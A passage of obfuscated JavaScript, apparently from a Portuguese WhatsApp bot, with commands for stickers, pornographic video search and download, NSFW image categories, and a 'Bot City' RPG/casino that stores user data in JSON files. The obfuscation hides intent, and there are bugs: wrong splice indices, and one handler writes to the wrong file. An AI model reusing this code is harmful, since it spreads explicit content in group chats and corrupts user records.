              _0x263319.sendMessage(_0x4f1071, {
                text: tkks.trim()
              }, _0x4fec4b);
              break;
            case "amongus":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " xbot");
                }
                _0x403602("_Aguarde, estou criando o sticker..._");
                const _0x25c883 = SITE_JEFF_APIS + "/api/sticker/amongus?texto=" + _0x1d6557 + "&apikey=" + _0x512d5e;
                const _0x4ae421 = await getBuffer(_0x25c883);
                const _0x47dca6 = {
                  sticker: _0x4ae421
                };
                const _0x18beb9 = {
                  quoted: _0xa6b34
                };
                await _0x263319.sendMessage(_0x4f1071, _0x47dca6, _0x18beb9);
              } catch (_0x21b7a2) {
                console.error(_0x21b7a2);
                return _0x403602("Erro ao criar sticker: " + _0x21b7a2.message);
              }
              break;
            case "figurinhas+18":
              if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se voce for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, informe a quantidade de figurinhas que deseja que eu envie!");
              }
              const _0x2eb079 = parseInt(_0x1d6557.trim());
              if (isNaN(_0x2eb079) || _0x2eb079 <= 0 || _0x2eb079 > 10) {
                return _0x403602("Digite um número válido de figurinhas, sendo no máximo 10.");
              }
              try {
                const _0x7b2014 = SITE_JEFF_APIS + "/api/stickers18?apikey=" + _0x512d5e;
                for (let _0x5e5848 = 0; _0x5e5848 < _0x2eb079; _0x5e5848++) {
                  const _0x16142e = await getBuffer(_0x7b2014);
                  const _0x17f3fc = "data:image/jpeg;base64," + _0x16142e.toString("base64");
                  const _0x323510 = new Sticker();
                  _0x323510.addFile(_0x17f3fc);
                  const _0x26b0d0 = {
                    pack: "bit.ly/bots-whats",
                    author: "" + NomeDoBot,
                    emojis: ["🤠", "🥶", "😻"]
                  };
                  _0x323510.options.metadata = _0x26b0d0;
                  const _0x4ff694 = await _0x323510.start();
                  const _0x355148 = _0x4ff694[0].value;
                  await _0x263319.sendMessage(_0x4f1071, {
                    sticker: fs.readFileSync(_0x355148)
                  });
                  fs.unlinkSync(_0x355148);
                }
              } catch (_0x544e06) {
                console.error(_0x544e06);
              }
              break;
            case "xvdown":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
                }
                const _0x10276f = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x32ac43 = {
                  react: _0x10276f
                };
                await _0x263319.sendMessage(_0x4f1071, _0x32ac43);
                const _0x507d57 = await fetchJson(SITE_JEFF_APIS + "/api/dl/xvideos?link=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                if (!_0x507d57.resultado) {
                  return _0x403602("Nenhum resultado encontrado.");
                }
                const _0x5debdd = {
                  text: "✅️",
                  key: _0x302296.key
                };
                const _0x5969cb = {
                  react: _0x5debdd
                };
                await _0x263319.sendMessage(_0x4f1071, _0x5969cb);
                const _0x347667 = "╭─⊣「 *X-VIDEOS* 」  \n❏ *Titulo:*  " + _0x507d57.resultado.title + "\n❏ *Views:* " + _0x507d57.resultado.views + "\n❏ *Link:*  " + _0x507d57.resultado.url + " \n      \n" + _0x6965b0 + "\n╰━━━━━━━━━━━━━";
                const _0x2a9717 = {
                  title: "",
                  body: "Clique aqui para ir ao site...",
                  mediaType: 1,
                  thumbnailUrl: "" + _0x507d57.resultado.thumb,
                  sourceUrl: "" + _0x507d57.resultado.url
                };
                const _0x118f3c = {
                  externalAdReply: _0x2a9717
                };
                const _0x400533 = {
                  text: "" + _0x347667,
                  contextInfo: _0x118f3c
                };
                const _0x15ce70 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x400533, _0x15ce70);
                await sleep(500);
                const _0x5e6353 = {
                  url: _0x507d57.resultado.url
                };
                const _0x3d41c6 = {
                  video: _0x5e6353,
                  mimetype: "video/mp4",
                  fileName: "Aqui está " + _0x55a6ac + " 🔥😈"
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3d41c6);
              } catch (_0x94383c) {
                console.error("Error processing xvdown command:", _0x94383c);
                return _0x403602("Ocorreu um erro ao processar sua solicitação.");
              }
              break;
            case "xvideos":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
                }
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome");
                }
                const _0x4f2693 = {
                  text: "🔞",
                  key: _0x302296.key
                };
                const _0x3b9cb2 = {
                  react: _0x4f2693
                };
                _0x263319.sendMessage(_0x4f1071, _0x3b9cb2);
                const _0x4e460b = await fetchJson(SITE_JEFF_APIS + "/api/pesquisa/xvideos?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x40931c = _0x4e460b.resultado.map((_0x5c5840, _0x2c52cb) => ({
                  id: _0x1d93be + "xvdown " + _0x5c5840.url,
                  header: "Opção " + (_0x2c52cb + 1),
                  title: "Titulo: ➥ " + _0x5c5840.title,
                  description: "Tempo: " + _0x5c5840.duration
                }));
                if (botoes_) {
                  const _0x1f698d = {
                    text: "━「 X-VIDEOS 」\n      \n-> Pesquisa: " + _0x1d6557 + "\n-> Videos encontrados: " + _0x4e460b.resultado.length + "\n      \n" + _0x6965b0 + " Escolha um video abaixo:\n━━━━━━━━━━━━━"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x1f698d,
                      footer: {
                        text: "Resultados da pesquisa"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "LISTA DE RESULTADOS",
                            sections: [{
                              title: "Resultados do Xvideos",
                              rows: _0x40931c
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  if (!_0xd20756) {
                    return _0x403602(_0x270bdf);
                  }
                  if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                    return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
                  }
                  const _0x307a08 = _0x84ebb => {
                    return Math.floor(Math.random() * _0x84ebb);
                  };
                  if (!_0x1d6557) {
                    return _0x403602("O que você quer pesquisar? Ex: " + _0x1d93be + "xvideos mia-khalifa");
                  }
                  try {
                    let _0x3f6749;
                    const _0x3fcbe5 = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x406699 = {
                      react: _0x3fcbe5
                    };
                    _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x406699);
                    ABCG = await fetchJson(SITE_JEFF_APIS + "/api/pesquisa/xvideos?query=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                    if (!ABCG || !ABCG.resultado || ABCG.resultado.length === 0) {
                      return _0x403602("Nenhum resultado encontrado para a pesquisa fornecida.");
                    }
                    _0xc3d45a = ABCG.resultado[_0x307a08(ABCG.resultado.length)];
                    if (!_0xc3d45a.url) {
                      return _0x403602("Link do vídeo não encontrado.");
                    }
                    media = await fetchJson(SITE_JEFF_APIS + "/api/dl/xvideos?link=" + _0xc3d45a.url + "&apikey=" + _0x512d5e);
                    const _0x34cf60 = {
                      text: "✅️",
                      key: _0x302296.key
                    };
                    const _0x1f89ac = {
                      react: _0x34cf60
                    };
                    _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x1f89ac);
                    _0x3f6749 = "━「 X-VIDEOS 」\n  \n❏ *Título:*  " + _0xc3d45a.title + "\n❏ *Duração:* " + _0xc3d45a.duration + "\n❏ *Link*  " + _0xc3d45a.url + "\n    \n" + _0x6965b0 + "\n━━━━━━━━━━━━━";
                    const _0x1e3997 = {
                      text: "" + _0x3f6749
                    };
                    const _0x2057ac = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x1e3997, _0x2057ac);
                    await sleep(500);
                    const _0x1d981b = {
                      url: media.resultado.url
                    };
                    const _0x550fb7 = {
                      video: _0x1d981b,
                      mimetype: "video/mp4",
                      fileName: "Aqui está " + _0x55a6ac + "🔥😈"
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x550fb7);
                  } catch (_0x14c55f) {
                    console.error(_0x14c55f);
                    return _0x403602("vish deu erro contate meu dono pra ele resolver");
                  }
                }
              } catch (_0x18b536) {
                console.error(_0x18b536);
              }
              break;
            case "xnxx":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
                }
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome");
                }
                const _0x22a6b9 = {
                  text: "🔞",
                  key: _0x302296.key
                };
                const _0x164e5e = {
                  react: _0x22a6b9
                };
                _0x263319.sendMessage(_0x4f1071, _0x164e5e);
                const _0x2ee84d = await fetchJson(SITE_JEFF_APIS + "/api/pesquisa/xnxx?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x517d79 = _0x2ee84d.resultado.map((_0x5bda02, _0x3c18cf) => ({
                  id: _0x1d93be + "xnxxbuttondl " + _0x5bda02.link,
                  header: "Opção " + (_0x3c18cf + 1),
                  title: "Titulo: ➥ " + _0x5bda02.title,
                  description: "Infos: " + _0x5bda02.info
                }));
                if (botoes_) {
                  const _0x5838c9 = {
                    text: "━「 XNXX 」\n      \n-> Pesquisa: " + _0x1d6557 + "\n-> Videos encontrados: " + _0x2ee84d.resultado.length + "\n      \n" + _0x6965b0 + " Escolha um video abaixo:\n━━━━━━━━━━━━━"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x5838c9,
                      footer: {
                        text: "Resultados da pesquisa"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "LISTA DE RESULTADOS",
                            sections: [{
                              title: "Resultados do XNXX",
                              rows: _0x517d79
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x39263d = _0x1c2b03 => Math.floor(Math.random() * _0x1c2b03);
                  let _0x36a57;
                  const _0x2be217 = {
                    text: "⏳",
                    key: _0x302296.key
                  };
                  const _0x10b4e4 = {
                    react: _0x2be217
                  };
                  let _0x761566 = await _0x263319.sendMessage(_0x4f1071, _0x10b4e4);
                  const _0x31cb68 = await fetchJson(SITE_JEFF_APIS + "/api/pesquisa/xnxx?query=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                  if (!_0x31cb68 || !_0x31cb68.resultado || _0x31cb68.resultado.length === 0) {
                    return _0x403602("Nenhum resultado encontrado para a pesquisa fornecida.");
                  }
                  const _0x8c039b = _0x31cb68.resultado[_0x39263d(_0x31cb68.resultado.length)];
                  if (!_0x8c039b.link) {
                    return _0x403602("Link do vídeo não encontrado.");
                  }
                  const _0x551e8c = await fetchJson(SITE_JEFF_APIS + "/api/dl/xnxx?link=" + _0x8c039b.link + "&apikey=" + _0x512d5e);
                  const _0x138243 = {
                    text: "✅️",
                    key: _0x302296.key
                  };
                  const _0x3aa226 = {
                    react: _0x138243
                  };
                  _0x761566 = await _0x263319.sendMessage(_0x4f1071, _0x3aa226);
                  _0x36a57 = "━「 XNXX 」\n      \n❏ *Título:*  " + _0x551e8c.resultado.title + "\n❏ *Infos:* " + _0x8c039b.info + "\n❏ *Link:*  " + _0x8c039b.link + "\n      \n" + _0x6965b0 + "\n━━━━━━━━━━━━━";
                  const _0x571bef = {
                    text: "" + _0x36a57
                  };
                  const _0x16f7ca = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x571bef, _0x16f7ca);
                  await sleep(500);
                  const _0x1eda5a = {
                    url: _0x551e8c.resultado.files.high
                  };
                  const _0x7f8382 = {
                    video: _0x1eda5a,
                    mimetype: "video/mp4",
                    fileName: "Aqui está " + _0x55a6ac + "🔥😈"
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x7f8382);
                }
              } catch (_0x4b9c72) {
                console.error(_0x4b9c72);
                _0x403602("Vish, deu erro. Contate meu dono para resolver.");
              }
              break;
            case "xnxxbuttondl":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
              }
              const _0x596954 = _0x3a0d45 => {
                return Math.floor(Math.random() * _0x3a0d45);
              };
              if (!_0x1d6557) {
                return _0x403602("O que você quer pesquisar? Ex: " + _0x1d93be + "xnxx mia-khalifa");
              }
              try {
                let _0x304fa0;
                const _0x16fcf6 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x1851e6 = {
                  react: _0x16fcf6
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x1851e6);
                ABCG = await fetchJson(SITE_JEFF_APIS + "/api/pesquisa/xnxx?query=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                if (!ABCG || !ABCG.resultado || ABCG.resultado.length === 0) {
                  return _0x403602("Nenhum resultado encontrado para a pesquisa fornecida.");
                }
                const _0x3ada75 = ABCG.resultado[_0x596954(ABCG.resultado.length)];
                if (!_0x3ada75.link) {
                  return _0x403602("Link do vídeo não encontrado.");
                }
                const _0xf6743a = await fetchJson(SITE_JEFF_APIS + "/api/dl/xnxx?link=" + _0x3ada75.link + "&apikey=" + _0x512d5e);
                const _0xb9e3d3 = {
                  text: "✅️",
                  key: _0x302296.key
                };
                const _0x50f956 = {
                  react: _0xb9e3d3
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x50f956);
                _0x304fa0 = "━「 X-VIDEOS 」\n  \n❏ *Título:*  " + _0xf6743a.resultado.title + "\n❏ *Duração:* " + _0xf6743a.resultado.duration + "\n❏ *Link*  " + _0x3ada75.link + "\n    \n" + _0x6965b0 + "\n━━━━━━━━━━━━━";
                const _0x5ab657 = {
                  text: "" + _0x304fa0
                };
                const _0x14ec7f = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x5ab657, _0x14ec7f);
                await sleep(500);
                const _0x19626e = {
                  url: _0xf6743a.resultado.files.low
                };
                const _0x545019 = {
                  video: _0x19626e,
                  mimetype: "video/mp4",
                  fileName: "Aqui está " + _0x55a6ac + "🔥😈"
                };
                _0x263319.sendMessage(_0x4f1071, _0x545019);
              } catch (_0x32f604) {
                console.error(_0x32f604);
                return _0x403602("vish deu erro contate meu dono pra ele resolver");
              }
              break;
            case "ahegao":
            case "ass":
            case "bdsm":
            case "blowjob":
            case "cuckold":
            case "cum":
            case "femdom":
            case "foot":
            case "gangbang":
            case "glasses":
            case "hentai":
            case "hentai2":
            case "jahy":
            case "manga":
            case "neko":
            case "orgy":
            case "panties":
            case "pussy":
            case "neko2":
            case "tentacles":
            case "tighs":
            case "yuri":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo, fale com um administrador ou se você for um apenas digite:\n" + _0x1d93be + "modonsfw 1");
              }
              _0x403602("hehe safadinho.. enviande 🍭🔥");
              const _0x1389fb = await getBuffer(SITE_JEFF_APIS + "/nsfw/" + _0x3dec88 + "?apikey=" + _0x512d5e);
              const _0x5843ed = {
                image: _0x1389fb,
                caption: "🍭Ta aq meu nobre🔥"
              };
              const _0x5b05d1 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x5843ed, _0x5b05d1);
              break;
            case "menurpg":
            case "menubotcity":
              if (!_0xd20756) {
                return enviar.msg.grupo;
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              const _0x4918a8 = {
                url: logoslink.logo
              };
              const _0x5ef559 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                image: _0x4918a8,
                caption: rpgmenu(_0x1d93be, _0x32e455),
                mentions: [_0x32e455]
              }, _0x5ef559);
              break;
            case "modorpg":
            case "modocity":
            case "modobc":
            case "botrpg":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x1d6557) {
                return _0x403602("Você está usando o comando de forma errada, verifique:\n• Ex: *" + (_0x1d93be + _0x3dec88) + " 1/0* _(1 para ativar, 0 para desativar)_");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (JSON.stringify(autorpg).includes(_0x4f1071) && autorpg[autorpg.map(_0xb9144 => _0xb9144.id).indexOf(_0x4f1071)].rpg == true) {
                  return _0x403602("Sistema *#BotCity*\n - O sistema já está ativado aqui no grupo.");
                }
                if (!JSON.stringify(autorpg).includes(_0x4f1071)) {
                  const _0x585cbb = {
                    id: _0x4f1071,
                    rpg: true
                  };
                  autorpg.push(_0x585cbb);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/autorpg.json", JSON.stringify(autorpg));
                } else {
                  autorpg[autorpg.map(_0x1c4be8 => _0x1c4be8.id).indexOf(_0x4f1071)].rpg = true;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/autorpg.json", JSON.stringify(autorpg));
                }
                _0x403602("Sistema *#BotCity* - Foi efetuado a ativação no grupo com sucesso...");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (JSON.stringify(autorpg).includes(_0x4f1071) && autorpg[autorpg.map(_0x20de5c => _0x20de5c.id).indexOf(_0x4f1071)].rpg == false) {
                  return _0x403602("Sistema *#BotCity* - O sistema não está ativado aqui no grupo.");
                }
                if (!JSON.stringify(autorpg).includes(_0x4f1071)) {
                  const _0x5e9fa5 = {
                    id: _0x4f1071,
                    rpg: false
                  };
                  autorpg.push(_0x5e9fa5);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/autorpg.json", JSON.stringify(autorpg));
                } else {
                  autorpg[autorpg.map(_0x448dd4 => _0x448dd4.id).indexOf(_0x4f1071)].rpg = false;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/autorpg.json", JSON.stringify(autorpg));
                }
                _0x403602("Sistema *#BotCity* - Foi desabilitado com sucesso no grupo.");
              }
              break;
            case "rgbc":
            case "rgbotcity":
              if (!_0xd20756) {
                return enviar.msg.grupo;
              }
              if (!_0x589394 && !_0x2a5ff3) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "modorpg 1 ou 0*.");
              }
              if (JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602("Seu registro foi encontrado em meu banco de dados! Use *" + _0x1d93be + "meubc* e consulte seu registro/dados");
              }
              if (!_0x1d6557) {
                return _0x403602("Digite seu nome após o comando, para seu registro ser feito com êxito.");
              }
              if (_0x1d6557.includes("@")) {
                return _0x403602("O registro foi cancelado na Bot City! Foi detectado um *@* no campo, retire-o e realize o registro novamente.");
              }
              bancos = ["Inter", "NuBank", "PagBank️", "Bradesco", "Next", "Caixa", "Santander️", "Banco do Brasil", "PicPay", "PayPal", "Itaú"];
              bank = bancos[Math.floor(Math.random() * bancos.length)];
              horarg = moment.tz("America/Sao_Paulo").format("HH:mm");
              hora10 = moment.tz("America/Sao_Paulo").format("HH");
              datarg = moment.tz("America/Sao_Paulo").format("DD/MM");
              dia10 = moment.tz("America/Sao_Paulo").format("DD");
              m10 = moment.tz("America/Sao_Paulo").format("MM");
              const _0x2bfe62 = {
                id: _0x32e455,
                gpid: _0x4f1071,
                hrg: horarg,
                drg: datarg,
                nome: _0x1d6557,
                namebank: bank,
                money: 0,
                pixD: 5,
                pixL: 100,
                limiteC: 15,
                horaC: hora10,
                diaC: dia10,
                mC: m10,
                limiteTh: 3,
                hrT: hora10,
                limiteTd: 24,
                diaT: dia10,
                mT: m10,
                bcbet: true
              };
              sabrpg.push(_0x2bfe62);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("Registro efetuado e concluído com êxito! Seja bem vindo(a) à Bot City, " + _0x1d6557);
              setTimeout(() => {
                const _0x15f898 = {
                  text: "Agora você pode trabalhar e ganhar muito dinheiro jogando e apostando em nossos jogos. Para consultar seu saldo atual, use: *" + _0x1d93be + "minhacarteira*"
                };
                _0x263319.sendMessage(_0x4f1071, _0x15f898);
              }, 1100);
              break;
            case "dados_bc":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602("ID do usuário não encontrado ou inexistente...");
              }
              _0x3529b0 = sabrpg.map(_0x57b846 => _0x57b846.id).indexOf(_0x32e455);
              _0x403602("• ID do usuário: " + sabrpg[_0x3529b0].id + "\n• ID do grupo: " + sabrpg[_0x3529b0].gpid + "\n• Hora de registro: " + sabrpg[_0x3529b0].hrg + "\n• Data de registro: " + sabrpg[_0x3529b0].drg + "\n• Nome de usuário: " + sabrpg[_0x3529b0].nome + "\n• Nome do banco: " + sabrpg[_0x3529b0].namebank + "\n• Dinheiro: " + sabrpg[_0x3529b0].money + "\n• Quantidade de pix diário: " + sabrpg[_0x3529b0].pixD + "\n• Limite de pix: " + sabrpg[_0x3529b0].pixL + "\n• Limite do cassino: " + sabrpg[_0x3529b0].limiteC + "\n• Hora do cassino: " + sabrpg[_0x3529b0].horaC + "\n• Dia do cassino: " + sabrpg[_0x3529b0].diaC + "\n• Mês do cassino: " + sabrpg[_0x3529b0].mC + "\n• Limite de trabalho por hora: " + sabrpg[_0x3529b0].limiteTh + "\n• Hora do trabalho: " + sabrpg[_0x3529b0].hrT + "\n• Limite de trabalho diário: " + sabrpg[_0x3529b0].limiteTd + "\n• Dia de trabalho: " + sabrpg[_0x3529b0].diaT + "\n• Mês de trabalho: " + sabrpg[_0x3529b0].mT);
              break;
            case "sairbc":
            case "sairbotcity":
              if (!_0x589394 && !_0x2a5ff3) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602("ID do usuário não encontrado ou inexistente...");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                  AC = cavalosrpg.map(_0x1d4d7b => _0x1d4d7b.id).indexOf(_0x32e455);
                  cavalosrpg.splice(AC, 1);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                }
                if (JSON.stringify(galosrpg).includes(_0x32e455)) {
                  AD = galosrpg.map(_0x5949fc => _0x5949fc.id).indexOf(_0x32e455);
                  galosrpg.splice(AC, 1);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                }
                if (JSON.stringify(roubosrpg).includes(_0x32e455)) {
                  AE = roubosrpg.map(_0x219b67 => _0x219b67.id).indexOf(_0x32e455);
                  roubosrpg.splice(AE, 1);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
                }
                _0x3529b0 = sabrpg.map(_0x1fa0a5 => _0x1fa0a5.id).indexOf(_0x32e455);
                sabrpg.splice(_0x3529b0, 1);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(sabrpg));
                _0x403602("Seu registro na Bot City foi deletado com sucesso... Volte sempre!");
              } else {
                _0x403602("Ao sair da Bot City, você concorda em apagar o seu registro completamente, isto é, todo o seu histórico de jogo.\n• Caso você esteja de acordo com isso, use: *" + (_0x1d93be + _0x3dec88) + " 1*");
              }
              break;
            case "delbotcity":
            case "delsc":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Digite o número do usuário que deseja remover da Bot City.");
              }
              _0x10bb9b = _0x1d6557 + "@s.whatsapp.net";
              _0x3529b0 = sabrpg.map(_0x21d824 => _0x21d824.id).indexOf(_0x10bb9b);
              if (_0x3529b0 < 0) {
                return _0x403602("O ID do usuário não foi localizado, *certifique-se se ele já tem registro.*");
              }
              if (JSON.stringify(cavalosrpg).includes(_0x10bb9b)) {
                AC = cavalosrpg.map(_0x3648d1 => _0x3648d1.id).indexOf(_0x10bb9b);
                cavalosrpg.splice(AC, 1);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              }
              if (JSON.stringify(galosrpg).includes(_0x10bb9b)) {
                AD = galosrpg.map(_0xc808b5 => _0xc808b5.id).indexOf(_0x10bb9b);
                galosrpg.splice(AC, 1);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
              }
              sabrpg.splice(_0x3529b0, 1);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("O usuário acaba de ser removido da *Bot City*, por mandato da soberania.");
              break;
            case "rpglistgp":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x589394 && !_0x2a5ff3) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              membros = "Lista de participantes do *grupo* que estão registrados no *RPG Bot City*:\n–\n";
              rpglistgp = 0;
              for (_0xc3d45a = 0; _0xc3d45a < _0x5b3ba6.length; _0xc3d45a++) {
                if (JSON.stringify(sabrpg).includes(_0x5b3ba6[_0xc3d45a].id)) {
                  membros += "Membro ID " + (_0xc3d45a + 1) + ". ❪▧⃯⃟ฺ࣭࣪͘ꕸ▸ @" + _0x5b3ba6[_0xc3d45a].id.split("@")[0] + "\n";
                  rpglistgp += 1;
                }
              }
              membros += "–\n• Quantidade: *" + rpglistgp + " participante(s).*";
              _0x5b6fe5(membros);
              break;
            case "meubc":
            case "meubotcity":
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              _0x3529b0 = sabrpg.map(_0x52b6ed => _0x52b6ed.id).indexOf(_0x32e455);
              dindin = Number(sabrpg[_0x3529b0].money).toFixed(2);
              if (dindin < 10) {
                var _0xf68982 = "0" + dindin;
              } else {
                var _0xf68982 = dindin;
              }
              myid = sabrpg[_0x3529b0].id.split("@")[0].slice(5);
              if (JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                AC = cavalosrpg.map(_0x3eb2b8 => _0x3eb2b8.id).indexOf(_0x32e455);
                percentualcavalo = Number(cavalosrpg[AC].countVc) / Number(Number(cavalosrpg[AC].countVc) + Number(cavalosrpg[AC].countDc)) * 100;
                if (Number(percentualcavalo) > 0) {
                  porcemnmr = percentualcavalo;
                } else {
                  porcemnmr = 0;
                }
                runcav = "• Quantidade de Cavalos que você possuí atualmente: *" + cavalosrpg[AC].cavalos.length + "*\n• Quantidade de Vitórias: *" + cavalosrpg[AC].countVc + "*\n• Porcentagem de Ganhos: *" + Number(porcemnmr).toFixed(1) + "%*\n• Dinheiro investido: *R$ " + Number(Number(cavalosrpg[AC].capitalVc) + Number(cavalosrpg[AC].capitalDc)).toFixed(2) + "*\n• Dinheiro lucrado: (R$): *R$ " + Number(cavalosrpg[AC].capitalVc).toFixed(2) + "*";
              } else {
                runcav = "️Você atualmente não está registrado na *corrida de cavalos*.";
              }
              if (JSON.stringify(galosrpg).includes(_0x32e455)) {
                AE = galosrpg.map(_0x415c33 => _0x415c33.id).indexOf(_0x32e455);
                percentualgalos = Number(galosrpg[AE].countVg) / Number(Number(galosrpg[AE].countVg) + Number(galosrpg[AE].countDg)) * 100;
                if (Number(percentualgalos) > 0) {
                  porcegalos = percentualgalos;
                } else {
                  porcegalos = 0;
                }
